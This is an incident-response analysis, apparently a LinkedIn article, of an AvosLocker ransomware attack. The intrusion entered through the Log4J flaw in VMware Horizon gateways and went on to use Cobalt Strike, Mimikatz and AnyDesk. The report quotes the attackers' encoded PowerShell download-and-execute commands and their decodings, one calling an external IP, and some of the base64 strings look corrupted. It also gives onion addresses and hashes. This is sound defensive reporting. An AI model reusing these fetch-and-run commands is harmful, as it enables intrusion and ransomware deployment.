@@ -1,0 +1,91 @@
+"RaaS AvosLocker Incident Response Analysis
+Flávio Costa
+Flávio Costa
+Cybersecurity Specialist and Spokesperson at Cisco | CompTIA Official Instructor and SME
+12 articles 
+Follow
+May 1, 2022
+
+Open Immersive Reader
+To preserve customer data privacy, I omitted all confidential information that could expose the organization's identity.
+Avos is a ransomware group that was first identified in 2021, initially targeting Windows machines, more recently now, a new ransomware variant of AvosLocker, named after the group, is also targeting Linux environments. In this article, I'll explain in an uncomplicated manner, how both variants act, based on the incident report I did for a customer that was impacted by this well-organized and high-skilled adversary.
+Well-funded and financially motivated, Avos has been active since June 2021 and follows the RaaS model, an affiliate program to recruit potential partners. The announcement of the program includes information about features of the ransomware and lets affiliates know that AvosLocker operators will take care of negotiation and extortion practices. The user “Avos” has also been observed trying to recruit individuals on the Russian forum XSS.
+hxxp://avosjon4pfh3y7ew3jdwz6ofw7lljcxlbk7hcxxmnxlh5kvf2akcqjad[.]onion (affiliate program)
+hxxp://avosqxh72b5ia23dl5fgwcpndkctuzqvh2iefk5imp3pi5gfhel5klad[.]onion (ransomware payment instructions)
+No alt text provided for this image
+The attackers use spam email campaigns as initial infection vectors for the delivery of the ransomware payload, in this incident report specifically, the initial vector was a ESXi server exposed on the internet over UAG from Horizon, which was vulnerable to Log4J. During the encryption, process files are appended with the “.avos” extension, but the updated variant appends with the extension “.avos2”. Linux version appends with the extension “.avoslinux”. According to deepweb research by Cyble Research Labs, the Threats Actors of Avos ransomware group are exploiting Microsoft Exchange Server vulnerabilities using Proxyshell, compromising the victim’s network. CVEs involved in these exploits are CVE-2021-34473, CVE-2021-31206, CVE-2021-34523, and CVE-2021-31207.
+The customer notified our team on the same date that the encryption occurred, March 7th 2022, but noticed activity related to the ransomware attack back to February 7th, 2022, all the data analyzed reported goes from that date till March 9th, 2022.
+No alt text provided for this image
+Important facts about the network virtualization topology above: vulnerabilities associated to Log4J were found on the VMWare Horizon Unified Access Gateways, UAG01 and UAG02, those were CVE-2021-44228 / CVE-2021-45046 / CVE-2021-45105 / CVE-2021-44832, which can potentially allow remote code execution on Unified Access Gateway by the low privilege non-root user named ""gateway"". Beyond that, the inner-transit firewalls that could control/limit the access to the internal VDI infrastructure were not configured, hence, that was used as the initial access to establish foothold in the customer's network, leading access to VDI-SERVER-A and VDI-SERVER-B.
+Cisco Secure Endpoint (formerly known as Advanced Malware Protection, AMP), was the EPP/EDR solution used in most endpoints, from workstations to servers, which allowed us to collect important information about the entire attack life-cycle. Unfortunately, this customer was short-staffed, and no one was looking into the many IoCs the tools was alerting as early as February 11th, which lead us to the first important conclusion: cybersecurity investment is not only important from what types of technology that you install/deploy, but also to the people and processes. Only the integration and harmony between the three of these will lead to a successful cybersecurity program.
+No alt text provided for this image
+No alt text provided for this image
+VDI-SERVER-B was the patient zero of this incident. The first signals/IoCs observed were on 02/11/22 at 01:41, WMI Provider Host (wmiprvse.exe), was used to start and run the PowerShell Download String in a coded manner (Command and Scripting Interpreter - T1059).
+No alt text provided for this image
+02/14/22 at 14:03:13 UTC: A retrospective detection has been triggered for the RuntimeBrokerService.exe executable, in C:\Windows\System32\temp\RuntimeBrokerService.exe creating the watcher file.exe  in C:\Windows\System32\temp\watcher.exe
+No alt text provided for this image
+In early March, several encoded PowerShell runs were observed, followed by attempted executions of executable files, using the c:\windows\temp\__psscriptpolicytest_k2rprfje.3f0.ps1 file; which by itself, does not necessarily imply a malicious indicator.
+03/04/22 at 14:17:50 UTC: PowerShell execution, observed in VDI-SERVER-B: Possible path: c:\windows\temp\__psscriptpolicytest_aqajcpgp.pou.ps1
+powershell.exe -exec bypass -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHKACWB0AGUAbQAuAEAZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKAKQAUAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAAA6ACAALwA0ADUALgAxADMANgAuADIAMwAwACAWAADEAOgA0ADAAMAAwACAAyADMANABSADIAMWAnACkAOwA=
+ Decoded (Base64): iex (New-Object SystemNetWebClient)DownloadString('http://45[.]136[.]230[.]191:4000/D234R23');
+ We can observe in the sequence that the script had exploited execution blocked in the use of kernel32.dll:
+No alt text provided for this image
+A few days later, on 03/06/22 at 17:56:18, the same sequence of PowerShell commands via psscriptpolicytest_salmhzqx.zc0.ps1 file, downloaded and tried to run the file vmware_kb.exe; Execution attempts were made until 20:04:51 UTC on the same day.
+No alt text provided for this image
+On 03/07/22 at 09:09:47 UTC, the rundll32 process was used via PowerShell to run mimikatz.
+On 03/07/22 at 09:13:06 UTC, there was a change in behavior and the msedgeprocess.exe was seen using the Process Injection (T1055) technique to run the Emotet malware.
+No alt text provided for this image
+Executions continued until the scanner.exe file was run, uncompressed via IIS Temporary Compressed Files.zip, for this file, Cobalt Strike beacons have been identified:
+No alt text provided for this image
+A few minutes later Mimikatz was used again using for Credential Dumping (T1003). And via command line (CMD), at 20:51:56 UTC, wmic.exe was possibly used to modify administrative settings on the local and remote computer (T1047). The association of these techniques indicates a possible start of lateral movement (TA0008)
+No alt text provided for this image
+Following, another encoded PowerShell command created a communication port on the localhost via port 32467 at 20:53:02 UTC. This IoC may be directly associated with TCP Beacon communication with Cobalt Strike, previously identified.
+powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAAAuAFcAZQBiAGMAbAbABpAGUAbgB0ACkALgBEAG8A dwBuAGwAbwAgAUQAUWB0AHIAAQBuAGcAKAAAGgAdAB0AAAOgAvAC8AMQAyADcALgAwAC4AMAAAAAAAAGAzADIANAA2AdcALwAnACkA
+Decoded (Base64): IEX (New-Object NetWebclient)DownloadString('http://127.0.0.1:32467/')
+Similar executions were made on 03/08/22, in the following sequence: W32. Rundll32PowershellEncodedBuffer.ioc -> W32. WMICRemoteProcess.ioc -> W32. PowershellEncodedLocalPort.ioc (also on localhost, however, using different ports 28035, 27475, 39090) -> PowerShell Download String
+On the same date, from 14:41:15 UTC, on the server STATE-T.local, the same behavior pattern was observed but performed with execution of a different binary (scanner.exe), SHA-256: 30ce323308b98f15a604b159404c232513a5f3dfba0bb050d8bbace2d271498, located at C:\Users\audit\Documents\scanner.exe; Transferred via AnyDesk.
+No alt text provided for this image
+At 19:48:28 UTC the file customer-name.exe, SHA-256: ffd933ad53f22a0f10cceb4986087258f72dffdd36999b7014c6b37c157e45f with possible origin from the compacted file ""iis temporary compressed files.zip"", went on to perform several actions associated with ransomware behavior:
+No alt text provided for this image
+Running multiple scripts .js and causing triggers for the following events:
+·        W32. PossibleRansomwareShadowDeletionDeletion.ioc
+·        W32. BCDEditDisableRecovery.ioc
+·        W32. ClearEventLogs.ioc
+And later:
+·        W32. NetUserAddAdministrator.ioc
+With multiple repetitions, registry key modifications, and txt file creation with ransom notes:
+No alt text provided for this image
+Relations Graph of the IoCs mentioned from the VDI-SERVER-B device analysis:
+No alt text provided for this image
+IoCs relationships chart associated with the file scanner.exe
+No alt text provided for this image
+Recommendations:
+Strengthening of server policies for Secure Endpoint (AMP);
+Maintain a consistent software update routine and enable automatic updates whenever possible;
+Review the possibility of switching from Secure Endpoint licensing to Premier model, which features Threat Hunting capabilities from the Cisco Talos team for Analysis of IoCs, Detections, and Action Recommendation, or the Pro version, which is a 100% Cisco-managed service.
+Implementation of continuous multi-factor authentication (MFA) for access to applications/RDP for example;
+Backups of critical infrastructure components, in a segmented network and ideally offline. Periodically test the restore procedure to ensure the integrity of the files;
+Reduce the attack surface by removing unused or unnecessary services (Secure Workload recommended);
+Block access to other recursive DNS servers and DoH infrastructures. Many requests for DoH servers have been identified in Cisco Umbrella. The category that detects DoH is enabled, but the work must be done in Firepower as well, because the server can be configured to access directly using ip instead of domain/FQDN. Essentially, add the following filters/rules to the firewall: ALLOW TCP/UDP IN/OUT for 208.67.222.222 or 208.67.220.220 on Port 53; BLOCK TCP/UDP IN/OUT any IPs on Port 53. More information at: https://support.umbrella.com/hc/en-us/articles/230904088-Preventing-Circumvention-of-Cisco-Umbrella-with-Firewall-Rules;  https://developer.cisco.com/network-automation/detail/335828e9-5b08-11eb-b2ad-0ec2761e2c74/
+Create or reinforce user awareness campaigns on how to identify and report phishing emails and how to protect yourself from social engineering attacks;
+Configure DKIM and DMARC to prevent malicious actors from using the organization's domain as part of phishing attacks;
+Specify restrictive rules for third-party access to the network;
+Implement firewall rules based on threat intelligence feeds that block access to malicious websites or IPs, phishing URLs, anonymous proxies, Tor network and anonymization services. Start with our list provided in this report;
+Disable Windows PowerShell, if not used. As noticed, ransomware variants use this feature to run malicious commands.
+Reduce the attack surface, avoiding the use of insecure protocols or remote access programs. If RDP-type access is absolutely necessary, restrict source IPs and require use of multi-factor authentication (MFA).
+Software Used: SoftPerfect Network Scanner; AnyDesk; Mimikatz; Advanced IP Scanner; PDQ Deploy; Cobalt Strike; pingb.in (used as DNS OOB exfiltration: a free service with no required config whatsoever, it uses ping, which is available in basically every system).
+Obs: the files were found in the folder C:\Program Files\Sophos, which it seems a tentative to bypass AV solutions that have exceptions configured for well-known vendors like Sophos. Base on my research, other solutions like Windows Defender; Kaspersky, Carbon Black, Trend Micro, Symantec, Bitdefender and Cylance might also be used. Here’s some evidence in an infected computer:
+No alt text provided for this image
+No alt text provided for this image
+You can see the software mentioned above, PDQ Deploy was used to distribute: the batch file nice.bat and payload college-name.exe on target computers. The .ps1 files highly obfuscated, were identified as Cobalt Strike beacons; college-name.bin files and the ransomware notes with payment instructions.
+The variant affecting Windows OS, in its most recent forms, uses multi-threaded tactics. It calls some APIs to create multiple instances of working threads in memory and share file paths between multiple threads, a fairly intelligent use of the computational power of multi-core CPUs. Avos uses two strong encryption algorithms. Symmetric: AES - to encrypt files, and asymmetric: RSA - to encrypt the generated AES keys. This is a very common combination that provides a high level of protection. You cannot recover the data without obtaining the original private key for a specific sample. We didn't find in the sample any routine responsible for uploading the stolen files. Still, because the delivery model of this ransomware presupposes manual access (AnyDesk), it is possible that data exfiltration is done manually by attackers. The ransom note instructs the user not to shut down the system if encryption is in progress to prevent file corruption. He asks the victim to visit an onion address via TOR to pay the ransom and get the decryption key to get back the files. In other attacks, evasion techniques were used to disable endpoint security solutions that get in the way by rebooting compromised systems into Windows Safe Mode, which allows for a much simpler way to encrypt victims' files.
+Summary of MITRE ATT&CK TTPs identified in this IR report:
+No alt text provided for this image
+References:
+https://blog.qualys.com/vulnerabilities-threat-research/2022/03/06/avoslocker-ransomware-behavior-examined-on-windows-linux
+https://www.tripwire.com/state-of-security/security-data-protection/avoslocker-ransomware-what-you-need-to-know/
+https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-avoslocker
+https://unit42.paloaltonetworks.com/atoms/avoslocker-ransomware/
+https://blog.cyble.com/2021/07/23/deep-dive-analysis-avoslocker-ransomware/
+https://cyberint.com/blog/research/avoslocker-the-rising-star-of-ransomware/
+https://blogs.vmware.com/security/2022/02/avoslocker-modern-linux-ransomware-threats.html"
